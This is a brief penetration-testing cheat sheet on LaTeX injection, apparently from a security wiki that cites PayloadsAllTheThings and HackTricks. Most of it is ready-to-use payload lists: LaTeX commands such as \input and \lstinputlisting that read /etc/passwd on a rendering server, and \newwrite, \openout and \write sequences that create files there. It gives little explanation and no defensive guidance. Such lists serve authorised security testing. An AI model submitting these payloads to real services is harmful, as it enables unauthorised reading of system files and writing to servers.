# LaTeX Injection

LaTeX is a software system for document preparation. It may be vulnerable to arbitrary command injection or path traversal.

### Payloads - Read Files <a href="#payloads-read-files" id="payloads-read-files"></a>

```shellscript
# Read file
\input{/etc/passwd}
$\input{/etc/passwd}$
$$\input{/etc/passwd}$$

\include{example} # Read example.tex
$\include{example}$
$$\include{example}$$

\lstinputlisting{/etc/passwd}
$\lstinputlisting{/etc/passwd}$
$$\lstinputlisting{/etc/passwd}$$
```

### Payloads - Write File <a href="#payloads-write-file" id="payloads-write-file"></a>

```shellscript
\newwrite\outfile
$\newwrite\outfile$
$$\newwrite\outfile$$

\openout\outfile=cmd.tex
$\openout\outfile=cmd.tex$
$$\openout\outfile=cmd.tex$$

\write\outfile{Hello-World}
$\write\outfile{Hello-World}$
$$\write\outfile{Hello-World}$$
```

### References <a href="#references" id="references"></a>

* [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection)
* [HackTricks](https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection)
